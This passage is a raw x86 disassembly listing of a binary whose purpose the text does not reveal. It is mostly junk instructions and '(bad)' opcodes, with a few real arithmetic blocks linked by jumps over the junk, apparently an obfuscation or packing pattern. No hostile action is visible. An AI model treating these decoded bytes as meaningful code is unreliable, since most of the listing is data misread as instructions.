  413f2f:	cmp    DWORD PTR [esi+0x4659da83],ecx
  413f35:	dec    esi
  413f36:	jl     0x413f6a
  413f38:	sub    edx,DWORD PTR [edx+0x60338a22]
  413f3e:	sub    edx,DWORD PTR [ecx+0x12]
  413f41:	cmp    BYTE PTR [esi+0x7e],0xe1
  413f45:	pop    edx
  413f46:	sahf   
  413f47:	ins    DWORD PTR es:[edi],dx
  413f48:	xor    bh,dh
  413f4a:	mov    DWORD PTR [ebp+0x349b20e8],0xc794319a
  413f54:	inc    esi
  413f55:	mov    esi,0x1742a1c8
  413f5a:	jl     0x413fbe
  413f5c:	push   edi
  413f5d:	mov    WORD PTR [edi],ds
  413f5f:	pop    edi
  413f60:	lock ret 
  413f62:	and    eax,0x5792c27d
  413f67:	aad    0x75
  413f69:	in     eax,0xca
  413f6b:	in     eax,0x3e
  413f6d:	arpl   WORD PTR [ebx+edi*8+0x33068214],dx
  413f74:	jmp    0xe92c950c
  413f79:	fcmove st,st(0)
  413f7b:	sahf   
  413f7c:	outs   dx,DWORD PTR ds:[esi]
  413f7d:	out    dx,eax
  413f7e:	push   esp
  413f7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f80:	call   0xbd27:0x64f87413
  413f87:	pop    ss
  413f88:	test   eax,0x17b03ea3
  413f8d:	cwde   
  413f8e:	(bad)  
  413f8f:	mov    bl,0x2a
  413f91:	or     eax,0xb062c0c0
  413f96:	xchg   ebp,eax
  413f97:	ins    DWORD PTR es:[edi],dx
  413f98:	pop    es
  413f99:	imul   ebp,DWORD PTR [edi-0x521f2d58],0x57606e44
  413fa3:	xor    dl,BYTE PTR [ebx]
  413fa5:	ficom  DWORD PTR [edx+0x4e264fc5]
  413fab:	sar    al,1
  413fad:	cmp    al,0xc2
  413faf:	(bad)  
  413fb1:	push   ss
  413fb2:	xor    ah,al
  413fb4:	lahf   
  413fb5:	cmp    eax,0x6c7961e0
  413fba:	fsubr  QWORD PTR [esi+0x1964dbb]
  413fc0:	pop    esi
  413fc1:	ror    esi,0xc
  413fc4:	push   0x9bfb945b
  413fc9:	shl    DWORD PTR [ecx-0x1d],cl
  413fcc:	fist   DWORD PTR [eax]
  413fce:	pop    ecx
  413fcf:	lds    esi,FWORD PTR [edx]
  413fd1:	mov    ds:0x34a921ac,eax
  413fd6:	(bad)  
  413fd7:	loopne 0x414041
  413fd9:	test   eax,0xcb4cd37
  413fde:	and    DWORD PTR [ebx],ebp
  413fe0:	pushf  
  413fe1:	fmul   QWORD PTR [ecx]
  413fe3:	mov    ebp,0xc33e2149
  413fe8:	imul   ebp,DWORD PTR [edx-0x5d9d42a5],0x234ee2bb
  413ff2:	fdivr  QWORD PTR [esi-0x3f2e7cf6]
  413ff8:	mov    al,0x65
  413ffa:	(bad)  
  413ffb:	std    
  413ffc:	imul   ecx,DWORD PTR [ecx]
  413fff:	adc    DWORD PTR [ebx-0x80],ebp
  414002:	retf   
  414003:	or     eax,0xc7b7012a
  414008:	mov    al,0x74
  41400a:	das    
  41400b:	pop    ebx
  41400c:	jb     0x414056
  41400e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41400f:	mov    BYTE PTR [eax+0x5e32a1b8],bh
  414015:	cld    
  414016:	dec    esp
  414017:	sub    BYTE PTR [edx-0x12],dl
  41401a:	loope  0x414027
  41401c:	retf   
  41401d:	jle    0x414006
  41401f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414020:	and    esp,edi
  414022:	add    eax,0x279fa535
  414027:	dec    BYTE PTR ds:0x98a5b631
  41402d:	(bad)  
  41402e:	leave  
  41402f:	shr    DWORD PTR [eax+0x5b2746ac],0xab
  414036:	ror    BYTE PTR [edx-0x9],1
  414039:	out    0x87,al
  41403b:	mov    al,0x7
  41403d:	sub    DWORD PTR [edx+0x33],edx
  414040:	mov    dh,0x1b
  414042:	push   cs
  414043:	stos   BYTE PTR es:[edi],al
  414044:	imul   eax,ebp,0x3d565f91
  41404a:	call   0x82b4ea48
  41404f:	(bad)  
  414050:	cld    
  414051:	cmc    
  414052:	fild   DWORD PTR [edi]
  414054:	jecxz  0x414019
  414056:	dec    edi
  414057:	or     BYTE PTR [eax+0xd83d64a],cl
  41405d:	cmp    al,0xb3
  41405f:	mov    ah,0xe
  414061:	or     BYTE PTR [edi+0x59],bl
  414064:	stc    
  414065:	push   ecx
  414066:	dec    esp
  414067:	stos   BYTE PTR es:[edi],al
  414068:	push   eax
  414069:	jle    0x414078
  41406b:	pop    edx
  41406c:	dec    ebx
  41406d:	sbb    cl,BYTE PTR [ecx+ebp*4-0x502acda1]
  414074:	jae    0x414055
  414076:	fstp   TBYTE PTR [ebx]
  414078:	inc    esi
  414079:	mov    ecx,DWORD PTR [ebp+0x10]
  41407c:	mov    edx,DWORD PTR [ebp+0x14]
  41407f:	xor    edx,edx
  414081:	shl    ecx,0x1e
  414084:	mov    ecx,DWORD PTR [ebp+0x10]
  414087:	xor    eax,esi
  414089:	or     eax,edx
  41408b:	mov    edx,DWORD PTR [ebp+0x14]
  41408e:	shrd   ecx,edx,0x2
  414092:	shr    edx,0x2
  414095:	mov    edx,DWORD PTR [ebp+0x10]
  414098:	mov    ebx,DWORD PTR [ebp+0x14]
  41409b:	xor    ecx,esi
  41409d:	xor    ebx,ebx
  41409f:	or     ecx,ebx
  4140a1:	shl    edx,0x1e
  4140a4:	jmp    0x4143dd
  4140a9:	pop    eax
  4140aa:	add    eax,0xb29872c6
  4140af:	jl     0x4140dc
  4140b1:	fisttp DWORD PTR [ecx-0x6a0d5b7a]
  4140b7:	inc    edx
  4140b8:	fisttp QWORD PTR [ebx-0x6e]
  4140bb:	mov    esi,0xbec4edbe
  4140c0:	mov    esi,0x8adc1746
  4140c5:	jmp    0x60d6:0x120bd6a0
  4140cc:	mov    eax,edx
  4140ce:	es cs jnp 0x414113
  4140d2:	nop
  4140d3:	lfs    ecx,FWORD PTR [ebp+0x7f]
  4140d7:	pop    esi
  4140d8:	push   es
  4140d9:	mov    eax,0x634b13ac
  4140de:	ins    DWORD PTR es:[edi],dx
  4140df:	and    bl,bl
  4140e1:	xor    al,0xf6
  4140e3:	call   0xf77efe5d
  4140e8:	mov    ch,0x8d
  4140ea:	pop    ebp
  4140eb:	pusha  
  4140ec:	pushf  
  4140ed:	pop    ebp
  4140ee:	in     al,dx
  4140ef:	and    cl,bh
  4140f1:	mov    edx,0x34230a
  4140f6:	mov    ds:0xc5f9407a,al
  4140fb:	nop
  4140fc:	fild   QWORD PTR [ebp-0x47981194]
  414102:	gs sahf 
  414104:	sbb    DWORD PTR [edi],0x5c2bebc8
  41410a:	jae    0x414124
  41410c:	or     al,0x25
  41410e:	jbe    0x4140d3
  414110:	cdq    
  414111:	mov    dh,0x20
  414113:	imul   ecx,DWORD PTR [edi],0x6b
  414116:	hlt    
  414117:	sbb    eax,0x4a24edbf
  41411c:	xchg   esp,eax
  41411d:	imul   esi,eax,0x57
  414120:	sub    al,0x8
  414122:	enter  0x7d57,0x11
  414126:	mov    al,0xd1
  414128:	mov    edx,0xec75a182
  41412d:	and    BYTE PTR ds:0xbc57be18,cl
  414133:	mov    dl,0x67
  414135:	stos   DWORD PTR es:[edi],eax
  414136:	stos   BYTE PTR es:[edi],al
  414137:	and    eax,0xdb479cac
  41413c:	mov    ebp,0xa4fb5912
  414141:	mov    esi,0xce84cdfb
  414146:	int    0xdd
  414148:	les    esi,FWORD PTR [ebp+0x43]
  41414b:	push   esp
  41414c:	outs   dx,BYTE PTR ds:[esi]
  41414d:	sbb    edi,DWORD PTR [ecx+eax*4]
  414150:	add    al,0xeb
  414152:	sub    bh,BYTE PTR [edi]
  414154:	push   ds
  414155:	or     al,0xa9
  414157:	lods   al,BYTE PTR ds:[esi]
  414158:	imul   ebx,DWORD PTR [ebx+edx*2],0x8a8db67e
  41415f:	push   ds
  414160:	retf   
  414161:	mov    edi,0x3385a163
  414166:	lods   al,BYTE PTR ds:[esi]
  414167:	xor    dl,dl
  414169:	lahf   
  41416a:	fbstp  TBYTE PTR [esi-0x78]
  41416d:	cmp    ah,BYTE PTR [ebp+0x44]
  414170:	pop    edx
  414171:	add    DWORD PTR ds:0x1d02e34c,ebp
  414177:	outs   dx,DWORD PTR ds:[esi]
  414178:	stos   DWORD PTR es:[edi],eax
  414179:	xor    bl,BYTE PTR [edx+0x6a]
  41417c:	fcmovne st,st(1)
  41417e:	xor    DWORD PTR [ebp-0x45196ae0],edi
  414184:	pop    eax
  414185:	daa    
  414186:	or     eax,DWORD PTR [ecx]
  414188:	push   cs
  414189:	xchg   BYTE PTR [ecx],ah
  41418b:	push   0x63addfe4
  414190:	jecxz  0x414159
  414192:	rcl    BYTE PTR [eax],cl
  414194:	arpl   WORD PTR [ecx+0x21dafade],cx
  41419a:	scas   eax,DWORD PTR es:[edi]
  41419b:	outs   dx,BYTE PTR ds:[esi]
  41419c:	pushf  
  41419d:	loop   0x41412d
  41419f:	test   BYTE PTR [esi+0x62],0xe5
  4141a3:	push   cs
  4141a4:	mov    bl,0xa1
  4141a6:	addr16 cs sub edx,ebx
  4141aa:	fsub   DWORD PTR [ebx]
  4141ac:	arpl   WORD PTR [esi],bp
  4141ae:	add    ebp,ebx
  4141b0:	mov    ds:0x9443c171,eax
  4141b5:	bnd jg 0x414158
  4141b8:	inc    edi
  4141b9:	sbb    eax,0xca020f04
  4141be:	and    DWORD PTR [eax+0x36],ebx
  4141c1:	xchg   edx,eax
  4141c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141c3:	xchg   esi,eax
  4141c4:	xor    DWORD PTR [edx+0x5376f2da],esp
  4141ca:	int    0xb9
  4141cc:	adc    bh,dl
  4141ce:	test   eax,0x37b1869c
  4141d3:	faddp  st(0),st
  4141d5:	jmp    0x414250
  4141d7:	cwde   
  4141d8:	add    BYTE PTR [esp+edx*8+0x63],0x10
  4141dd:	cmp    DWORD PTR [edi-0x11bffd92],esi
  4141e3:	pusha  
  4141e4:	out    dx,al
  4141e5:	inc    edx
  4141e6:	jbe    0x4141e0
  4141e8:	jo     0x4141df
  4141ea:	pushf  
  4141eb:	jmp    0x414207
  4141ed:	jmp    0x2984:0xad60701f
  4141f4:	sahf   
  4141f5:	les    esi,FWORD PTR [eax]
  4141f7:	in     eax,dx
  4141f8:	stc    
  4141f9:	sub    DWORD PTR [edi],ecx
  4141fb:	dec    ebp
  4141fc:	push   ebp
  4141fd:	add    BYTE PTR [edi+0xd31ed73],cl
  414203:	mov    edi,0xf1ffdc9b
  414208:	mov    edi,0x15099337
  41420d:	push   eax
  41420e:	test   eax,0x20085591
  414213:	pusha  
  414214:	fisttp QWORD PTR [ecx-0x77]
  414217:	dec    ecx
  414218:	arpl   WORD PTR [ebp-0x615cfa1e],sp
  41421e:	pop    esp
  41421f:	sar    DWORD PTR [ecx],0xdf
  414222:	jae    0x4142a1
  414224:	mov    edx,0x87a5e653
  414229:	jmp    0x414286
  41422b:	mov    edi,0x2761e8e4
  414230:	jg     0x4142a5
  414232:	aas    
  414233:	inc    ecx
  414234:	and    DWORD PTR [edx],esi
  414236:	adc    bl,BYTE PTR [edi]
  414238:	(bad)  
  414239:	mov    ds:0x3734d212,eax
  41423e:	lds    edi,FWORD PTR [eax]
  414240:	mov    eax,0xb3270844
  414245:	or     DWORD PTR [edi],0x188068e2
  41424b:	iret   
  41424c:	aas    
  41424d:	or     BYTE PTR [ebp+0x57],dh
  414250:	in     eax,0xc0
  414252:	(bad)  
  414253:	pop    ds
  414254:	add    dl,BYTE PTR [ecx+ebx*2+0x437e6cc5]
  41425b:	das    
  41425c:	pop    ss
  41425d:	sahf   
  41425e:	cmc    
  41425f:	mov    al,ds:0x1a8699c7
  414264:	cs retf 
  414266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414267:	fwait
  414268:	in     eax,dx
  414269:	test   BYTE PTR [esi+esi*1+0x142ed75f],ch
  414270:	loope  0x4142b8
  414272:	mov    esp,0xe7ce9be1
  414277:	xor    ch,BYTE PTR [edx+0x15]
  41427a:	pop    edi
  41427b:	cli    
  41427c:	lds    eax,FWORD PTR [eax+edi*1]
  41427f:	jg     0x414212
  414281:	cli    
  414282:	sub    bh,ch
  414284:	lods   eax,DWORD PTR ds:[esi]
  414285:	xchg   di,ax
  414287:	xrelease mov DWORD PTR [ebp+0x7f],ebx
  41428b:	rol    DWORD PTR [edi+edx*8-0x5be0ad3a],1
  414292:	adc    dl,BYTE PTR [ecx+0x2c2fd34a]
  414298:	jp     0x414319
  41429a:	or     BYTE PTR [edx+ebx*2],0xb3
  41429e:	pop    ds
  41429f:	sub    cl,dl
  4142a1:	addr16 ret 0x8f2c
  4142a5:	jb     0x414307
  4142a7:	jp     0x41430d
  4142a9:	push   esp
  4142aa:	cld    
  4142ab:	sub    ebx,DWORD PTR [ecx-0x2641c33b]
  4142b1:	push   ecx
  4142b2:	sub    eax,0x1950e1d1
  4142b7:	xor    eax,0x2098c974
  4142bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142bd:	mov    cl,0xe9
  4142bf:	shr    BYTE PTR [esi+0x48],cl
  4142c2:	ss (bad) 
  4142c4:	lods   eax,DWORD PTR ds:[esi]
  4142c5:	mov    ah,0xf6
  4142c7:	adc    eax,0x700f22f7
  4142cc:	stos   BYTE PTR es:[edi],al
  4142cd:	lock out 0x35,eax
  4142d0:	jae    0x41429b
  4142d2:	dec    ebx
  4142d3:	std    
  4142d4:	aad    0xe0
  4142d6:	scas   eax,DWORD PTR es:[edi]
  4142d7:	ret    
  4142d8:	jmp    0x82a0:0x6719b037
  4142df:	aad    0x65
  4142e1:	and    BYTE PTR [ecx-0x78f63d18],cl
  4142e7:	mov    ecx,0xc141d651
  4142ec:	mov    ah,0x53
  4142ee:	mov    ebp,0xf888032a
  4142f3:	pop    edi
  4142f4:	test   DWORD PTR [eax+0x3b],esp
  4142f7:	push   ebx
  4142f8:	(bad)  
  4142fa:	and    DWORD PTR [edi+0x39],0x50d47282
  414301:	jbe    0x414302
  414303:	pop    edi
  414304:	int3   
  414305:	add    BYTE PTR [ebx],cl
  414307:	imul   edi,DWORD PTR ds:0xb1617bba,0x2c34594f
  414311:	mov    WORD PTR [ebp-0x3],?
  414314:	add    DWORD PTR [ebp-0x3c],eax
  414317:	dec    esp
  414318:	jmp    0x7e72:0x5985b14f
  41431f:	dec    edi
  414320:	mov    edx,DWORD PTR cs:[edx+0x3341fb33]
  414327:	add    BYTE PTR [edx-0x61642c44],al
  41432d:	movhps QWORD PTR [ecx+0x18eeb74d],xmm2
  414334:	imul   esp,ecx,0x29
  414337:	or     eax,ebp
  414339:	add    DWORD PTR [ebp+ebx*2-0x30],ecx
  41433d:	sti    
  41433e:	jle    0x4142d6
  414340:	out    0xfb,al
  414342:	pop    esi
  414343:	xor    BYTE PTR [ebp+0x32],cl
  414346:	cli    
  414347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414348:	mov    eax,0xbabead0e
  41434d:	cmp    DWORD PTR [esi],ebx
  41434f:	pop    edx
  414350:	pop    esi
  414351:	dec    ebx
  414352:	sbb    dl,BYTE PTR [ecx+0x396e2557]
  414358:	sbb    DWORD PTR [edx-0x19],edi
  41435b:	inc    ebp
  41435c:	mov    dl,0xc1
  41435e:	mov    al,ds:0x58cef251
  414363:	arpl   si,sp
  414365:	inc    eax
  414366:	pop    ebp
  414367:	cmp    ch,BYTE PTR [ecx-0x633c58fb]
  41436d:	fld    QWORD PTR [edx]
  41436f:	mov    ah,0x7e
  414371:	and    BYTE PTR [ecx],bl
  414373:	or     bh,BYTE PTR [edi+0x49942136]
  414379:	shl    DWORD PTR [eax+ebx*4+0x14],1
  41437d:	jl     0x414381
  41437f:	neg    DWORD PTR [ebp+0x4ec790bc]
  414385:	and    ah,BYTE PTR [eax-0x77e95230]
  41438b:	mov    ds:0x9185314c,eax
  414390:	stc    
  414391:	mul    BYTE PTR [ecx-0x26]
  414394:	retf   0xb2c1
  414397:	cmp    cl,BYTE PTR ss:[edi+0x7d]
  41439b:	push   eax
  41439c:	cmp    edx,DWORD PTR [esi]
  41439e:	adc    edx,eax
  4143a0:	cmp    DWORD PTR [esi-0x63],ebp
  4143a3:	(bad)  
  4143a4:	jp     0x414417
  4143a6:	mov    ebp,0xf4ee461c
  4143ab:	cmp    bl,BYTE PTR [eax]
  4143ad:	inc    ecx
  4143ae:	mov    al,ds:0xb6bcc2fc
  4143b3:	retf   0xd04e
  4143b6:	xor    BYTE PTR [ebx+0x30],dh
  4143b9:	aas    
  4143ba:	cwde   
  4143bb:	retf   
  4143bc:	cmp    BYTE PTR [edi+edx*1-0x7a],dh
  4143c0:	jno    0x414423
  4143c2:	sub    ch,BYTE PTR [edx-0x12]
  4143c5:	mov    DWORD PTR [ebp-0x739502b0],edi
  4143cb:	mov    eax,DWORD PTR [eax-0x45816c27]
  4143d1:	add    eax,0x6c891079
  4143d6:	xchg   edx,eax
  4143d7:	mov    BYTE PTR [edx+ebp*1+0x3f9a059],dh
  4143de:	ror    DWORD PTR [ebx+0x558b104d],0x14
  4143e5:	shrd   ecx,edx,0x2
  4143e9:	shr    edx,0x2
  4143ec:	xor    ecx,esi
  4143ee:	jmp    0x414727
  4143f3:	cmp    eax,0xb8c710f5
  4143f8:	sub    BYTE PTR [ebp+0x76acc878],dl
  4143fe:	xchg   edx,eax
  4143ff:	adc    eax,0x7bcfbdae
  414404:	cwde   
  414405:	mov    esi,0xbec4edbe
  41440a:	mov    esi,0xc3c8bbf5
  41440f:	ret    0xf1b
  414412:	retf   
  414413:	jb     0x414416
  414415:	mov    es,ebp
  414417:	js     0x414435
  414419:	les    esp,FWORD PTR [esi-0x79]
  41441c:	cmp    ah,bh
  41441e:	and    esi,DWORD PTR [ebp+0x21b663ec]
  414424:	in     eax,0x8b
  414426:	ds cwde 
  414428:	je     0x414447
  41442a:	outs   dx,DWORD PTR ds:[esi]
  41442b:	inc    esp
  41442c:	cdq    
  41442d:	loop   0x414427
  41442f:	fbld   TBYTE PTR [ecx+edi*2]
  414432:	int3   
  414433:	std    
  414434:	clc    
  414435:	mov    WORD PTR [edi],?
  414437:	cmp    edx,DWORD PTR ds:0xb6eb7cb6
  41443d:	xchg   DWORD PTR [eax],ecx
  41443f:	push   di
  414441:	xchg   edi,eax
  414442:	fidiv  WORD PTR [ecx+0x7c]
  414445:	push   0xaabc2498
  41444a:	cwde   
  41444b:	cmp    eax,0x145e47b0
  414450:	jmp    0xd096:0x32846e21
  414457:	sub    eax,0xa466915a
  41445c:	push   0x17
  41445e:	into   
  41445f:	retf   
  414460:	call   0x54c3:0x95bcd588
  414467:	push   esp
  414468:	mov    esi,edx
  41446a:	jo     0x4144bb
  41446c:	mov    BYTE PTR [ecx-0x43ede66e],cl
  414472:	sbb    esi,DWORD PTR [eax-0x16]
  414475:	sbb    al,0xc5
  414477:	not    DWORD PTR [eax+0x12]
  41447a:	sub    BYTE PTR [edx],0x74
  41447d:	bound  edx,QWORD PTR [eax+0x11]
  414480:	rcr    edx,0xb7
  414483:	pusha  
  414484:	pop    ecx
  414485:	mov    bl,0xd4
  414487:	xlat   BYTE PTR ds:[ebx]
  414488:	xor    al,0x3
  41448a:	jl     0x4144d8
  41448c:	loop   0x4144ac
  41448e:	jbe    0x414438
  414490:	xchg   BYTE PTR [edx-0x118b5b02],dl
  414496:	inc    esp
  414497:	test   cl,al
  414499:	fnstsw WORD PTR ds:0x32b9db0a
  41449f:	mov    esi,0xfdd9c454
  4144a4:	ins    DWORD PTR es:[edi],dx
  4144a5:	cmp    bl,BYTE PTR [ebx]
  4144a7:	or     eax,0x3efb85b2
  4144ac:	les    ebp,FWORD PTR [edi]
  4144ae:	sbb    eax,0x3d905d22
  4144b3:	cmp    edx,DWORD PTR [ebp+0x6658ca22]
  4144b9:	outs   dx,BYTE PTR ds:[esi]
  4144ba:	xor    al,0x2
  4144bc:	imul   esi,edi,0xffffffb7
  4144bf:	add    al,0x64
  4144c1:	repnz scas eax,DWORD PTR es:[edi]
  4144c3:	jo     0x41445d
  4144c5:	fild   DWORD PTR [ebx+0x4a]
  4144c8:	jno    0x414482
  4144ca:	shl    BYTE PTR [ebx-0x80],0x1c
  4144ce:	ret    
  4144cf:	test   BYTE PTR [eax-0x6b],dh
  4144d2:	(bad)  
  4144d3:	mov    eax,0xbcf01e06
  4144d8:	inc    ebp
  4144d9:	sti    
  4144da:	mov    edx,0x399efb5b
  4144df:	into   
  4144e0:	pop    ecx
  4144e1:	sub    DWORD PTR [edi+ecx*4-0x1e9e1909],ebx
  4144e8:	outs   dx,BYTE PTR ds:[esi]
  4144e9:	out    0x46,eax
  4144eb:	adc    DWORD PTR [edx+0x2d],edx
  4144ee:	mov    esi,0xa84197d5
  4144f3:	imul   edi,edi,0xada1562
  4144f9:	int    0xa1
  4144fb:	jo     0x414526
  4144fd:	mov    eax,0xe0b9332b
  414502:	fnsave [eax-0x7]
  414505:	addr16 inc edi
  414507:	adc    ch,al
  414509:	and    bh,BYTE PTR [ebp-0x39b35a66]
  41450f:	dec    edi
  414510:	cdq    
  414511:	xor    eax,0xc2b31460
  414516:	adc    ebp,esp
  414518:	mov    ds,WORD PTR [ebx-0x5a]
  41451b:	jbe    0x414593
  41451d:	fcomip st,st(2)
  41451f:	ret    0xed80
  414522:	jmp    0xe5e18d8c
  414527:	cmp    al,0x87
  414529:	imul   BYTE PTR [edi+0x5a45ea9d]
  41452f:	fistp  QWORD PTR [ebp-0x63]
  414532:	or     eax,0xa75ce352
  414537:	clc    
  414538:	stos   DWORD PTR es:[edi],eax
  414539:	pop    esi
  41453a:	pop    esi
  41453b:	sub    eax,0x466b8b08
  414540:	pop    ecx
  414541:	(bad)  
  414542:	sahf   
  414543:	add    eax,0x6ad86873
  414548:	jmp    0x4145a7
  41454a:	jge    0x414558
  41454c:	sbb    bh,bh
  41454e:	push   ecx
  41454f:	shr    esi,1
  414551:	mov    bh,bl
  414553:	lock mov ds:0x6a853212,al
  414559:	out    0x5e,al
  41455b:	xchg   ebp,eax
  41455c:	sbb    al,BYTE PTR [ebx-0x37]
  41455f:	cmp    al,0x42
  414561:	xlat   BYTE PTR ds:[ebx]
  414562:	jecxz  0x4144fd
  414564:	repnz mov ebx,DWORD PTR [eax]
  414567:	add    BYTE PTR ds:0xebb79353,dl
  41456d:	cmp    eax,0x8982018b
  414572:	fidivr DWORD PTR [ebx]
  414574:	into   
  414575:	ror    BYTE PTR [esi+edx*4],0xc6
  414579:	clc    
  41457a:	mov    dh,0xab
  41457c:	outs   dx,DWORD PTR ds:[esi]
  41457d:	push   cs
  41457e:	pop    esp
  41457f:	rcl    dl,0xe1
  414582:	(bad)  
  414583:	(bad)  
  414584:	mov    esp,0x1598a5b5
  414589:	cdq    
  41458a:	gs xchg esp,eax
  41458c:	mov    ebp,0xa5f1a56e
  414591:	add    edi,DWORD PTR [edi-0x32]
  414594:	or     bh,0x1c
  414597:	inc    eax
  414598:	scas   al,BYTE PTR es:[edi]
  414599:	(bad)  
  41459a:	push   ebx
  41459b:	inc    edi
  41459c:	clc    
  41459d:	or     cl,dl
  41459f:	add    BYTE PTR [ebp+0x2cc69f62],dl
  4145a5:	or     BYTE PTR [edi-0x170df28],bh
  4145ab:	mov    ecx,ebx
  4145ad:	pop    ecx
  4145ae:	pop    eax
  4145af:	cmc    
  4145b0:	mov    edx,0x65d383fd
  4145b5:	mov    edi,0xe3a87f40
  4145ba:	dec    esi
  4145bb:	retf   0xdc7
  4145be:	pop    esi
  4145bf:	sbb    DWORD PTR [ecx+0x35bdbe3b],ebx
  4145c5:	and    BYTE PTR [edx-0x18074075],dh
  4145cb:	mov    BYTE PTR [ebx-0x3aaa57cc],bl
  4145d1:	xor    al,0xa
  4145d3:	xor    cl,BYTE PTR [eax]
  4145d5:	lods   eax,DWORD PTR ds:[esi]
  4145d6:	jmp    0x3c00e66d
  4145db:	in     al,0xfb
  4145dd:	out    dx,al
  4145de:	jp     0x414596
  4145e0:	sbb    DWORD PTR [esi-0x41],ecx
  4145e3:	jle    0x4145a9
  4145e5:	dec    edx
  4145e6:	lds    edx,FWORD PTR [eax]
  4145e8:	cs enter 0xf54c,0xb2
  4145ed:	pop    es
  4145ee:	mov    BYTE PTR [edx-0x6f2f0d03],ah
  4145f4:	or     DWORD PTR [eax+0x5e2c2f3],esi
  4145fa:	popf   
  4145fb:	dec    edi
  4145fc:	xor    BYTE PTR [ebp+ecx*4-0x5800eda5],0xa3
  414604:	sub    ecx,DWORD PTR [ecx-0x38]
  414607:	(bad)  [eax]
  414609:	jge    0x41464d
  41460b:	cmp    ah,BYTE PTR [ebx+0x43d70e20]
  414611:	cmc    
  414612:	fstp   TBYTE PTR [edi-0x4b]
  414615:	(bad)  
  414616:	xlat   BYTE PTR ds:[ebx]
  414617:	iret   
  414618:	mov    ecx,0x3d9f7298
  41461d:	xlat   BYTE PTR ds:[ebx]
  41461e:	pop    ds
  41461f:	and    cl,BYTE PTR [eax]
  414621:	fistp  DWORD PTR ds:0xd0202959
  414627:	loop   0x414679
  414629:	jb     0x4145bd
  41462b:	popa   
  41462c:	xchg   ebp,eax
  41462d:	push   edx
  41462e:	or     ecx,DWORD PTR [edx]
  414630:	data16 jae 0x414673
  414633:	pop    ds
  414634:	rcl    ah,1
  414636:	cmp    esi,edi
  414638:	mov    fs,WORD PTR [ecx+ebx*2]
  41463b:	ds push cs
  41463d:	xor    BYTE PTR [ecx],cl
  41463f:	call   FWORD PTR [eax+ebx*2+0x7cfe6945]
  414646:	add    esi,DWORD PTR [edi]
  414648:	push   ds
  414649:	aam    0x4b
  41464b:	rol    BYTE PTR [eax],1
  41464d:	mov    ds:0x6301f624,al
  414652:	gs mov ecx,0x3f98f583
  414658:	mov    DWORD PTR [ebx+edx*4],ecx
  41465b:	or     dh,BYTE PTR [eax+eiz*2]
  41465e:	adc    DWORD PTR [ecx],eax
  414660:	dec    esi
  414661:	sub    BYTE PTR [eax+edx*1],dh
  414664:	jp     0x4146c8
  414666:	jns    0x414650
  414668:	sub    eax,DWORD PTR [ebx*4-0x1d554724]
  41466f:	pop    ebp
  414670:	scas   al,BYTE PTR es:[edi]
  414671:	scas   al,BYTE PTR es:[edi]
  414672:	cmp    eax,0x8866d5ac
  414677:	mov    ch,0x4e
  414679:	mov    ch,0x1a
  41467b:	xchg   ebp,eax
  41467c:	scas   eax,DWORD PTR es:[edi]
  41467d:	sub    BYTE PTR [esi-0x58],0xdf
  414681:	mov    al,0x6d
  414683:	adc    eax,0x6c16629d
  414688:	xor    ebx,eax
  41468a:	cmp    dl,BYTE PTR [eax-0x79]
  41468d:	pusha  
  41468e:	addr16 cld 
  414690:	and    al,0xb8
  414692:	int3   
  414693:	add    al,0x37
  414695:	jb     0x4146af
  414697:	pusha  
  414698:	xchg   edi,eax
  414699:	mov    esi,0xcde8071c
  41469e:	mov    DWORD PTR [edx+0x2cae9ebf],esi
  4146a4:	xchg   esp,eax
  4146a5:	jle    0x414700
  4146a7:	inc    ebx
  4146a8:	loope  0x414711
  4146aa:	dec    eax
  4146ab:	pop    esp
  4146ac:	jmp    0x41463e
  4146ae:	mov    BYTE PTR [esi-0xd11497e],dl
  4146b4:	cmp    esp,DWORD PTR [esi]
  4146b6:	loop   0x41467f
  4146b8:	mov    ebx,0xc0ef5d7d
  4146bd:	(bad)  
  4146be:	mov    ebx,0x98b440d2
  4146c3:	aas    
  4146c4:	and    bh,BYTE PTR [ecx]
  4146c6:	ja     0x4146a5
  4146c8:	xchg   ecx,eax
  4146c9:	ins    DWORD PTR es:[edi],dx
  4146ca:	into   
  4146cb:	mov    cl,0x37
  4146cd:	push   edx
  4146ce:	fbld   TBYTE PTR [ebp+0x4974e529]
  4146d4:	ja     0x4146d8
  4146d6:	pop    ebx
  4146d7:	push   ebx
  4146d8:	xchg   edx,eax
  4146d9:	daa    
  4146da:	adc    BYTE PTR [edx-0x3f],ch
  4146dd:	dec    ebx
  4146de:	or     BYTE PTR [eax],ch
  4146e0:	sub    ebp,DWORD PTR [edx+0x1812fc73]
  4146e6:	mov    WORD PTR [edx-0x69f3bbbe],ss
  4146ec:	push   edi
  4146ed:	lock jg 0x414723
  4146f0:	xchg   esi,eax
  4146f1:	js     0x4146ed
  4146f3:	je     0x4146f1
  4146f5:	test   eax,0x1f5bf6bf
  4146fa:	repz add al,0x59
  4146fd:	xchg   ebx,eax
  4146fe:	mov    dl,0xc2
  414700:	stc    
  414701:	jns    0x414755
  414703:	aaa    
  414704:	cmovl  edx,DWORD PTR [esi-0x4d]
  414708:	push   edi
  414709:	and    esi,ecx
  41470b:	xor    ah,BYTE PTR [ecx]
  41470d:	add    ch,BYTE PTR [ebp-0x13faaddf]
  414713:	retf   
  414714:	loope  0x414714
  414716:	add    al,0x16
  414718:	dec    esp
  414719:	and    bh,BYTE PTR [eax]
  41471b:	lds    esp,FWORD PTR [edx+0x44]
  41471e:	outs   dx,WORD PTR ds:[esi]
  414720:	ja     0x4146fd
  414722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414723:	fild   DWORD PTR [ecx]
  414725:	sbb    DWORD PTR [ecx],edi
  414727:	mov    edx,DWORD PTR [ebp+0x10]
  41472a:	mov    ebx,DWORD PTR [ebp+0x14]
  41472d:	xor    ebx,ebx
  41472f:	or     ecx,ebx
  414731:	add    eax,ecx
  414733:	lea    eax,[ebp+eax*4-0x7c]
  414737:	push   eax
  414738:	shl    edx,0x1e
  41473b:	call   0x411c08
  414740:	mov    eax,DWORD PTR [ebp-0x80]
  414743:	mov    ecx,DWORD PTR [ebp-0x80]
  414746:	xor    eax,edi
  414748:	xor    ecx,0xfffffffe
  41474b:	shr    eax,0x2
